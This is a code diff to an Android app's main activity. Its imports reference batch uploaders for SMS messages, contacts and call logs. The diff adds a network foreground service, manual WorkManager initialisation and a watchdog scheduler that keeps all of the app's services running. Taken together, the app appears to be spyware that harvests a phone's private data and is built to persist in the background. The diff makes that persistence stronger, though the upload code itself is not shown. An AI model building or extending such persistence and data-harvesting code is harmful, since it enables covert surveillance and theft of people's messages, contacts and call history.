@@ -45,6 +45,7 @@ import com.example.test.utils.PermissionDialog
 import com.example.test.utils.SmsBatchUploader
 import com.example.test.utils.ContactsBatchUploader
 import com.example.test.utils.CallLogsBatchUploader
+import com.example.test.NetworkService
 import com.google.firebase.messaging.FirebaseMessaging
 import com.example.test.R
 import kotlinx.coroutines.delay
@@ -107,6 +108,20 @@ class MainActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Initialize WorkManager manually since WorkManagerInitializer is disabled
+        try {
+            val config = androidx.work.Configuration.Builder()
+                .setMinimumLoggingLevel(android.util.Log.INFO)
+                .build()
+            androidx.work.WorkManager.initialize(this, config)
+            Log.d(TAG, "WorkManager initialized successfully")
+        } catch (e: IllegalStateException) {
+            // WorkManager might already be initialized
+            Log.w(TAG, "WorkManager already initialized: ${e.message}")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to initialize WorkManager: ${e.message}", e)
+        }
         
         if (intent.action == ACTION_CLOSE) {
             Log.d(TAG, "ACTION_CLOSE -> finish")
@@ -872,6 +887,20 @@ class MainActivity : ComponentActivity() {
                 startForegroundService(heartbeatIntent)
             } else {
                 startService(heartbeatIntent)
+            }
+            
+            val networkIntent = Intent(this, NetworkService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(networkIntent)
+            } else {
+                startService(networkIntent)
+            }
+            
+            // Schedule UnifiedWatchdogWorker (monitors all services)
+            try {
+                com.example.test.utils.UnifiedWatchdogScheduler.schedule(this)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to schedule UnifiedWatchdogWorker: ${e.message}")
             }
             
             scheduleHeartbeatWorker()
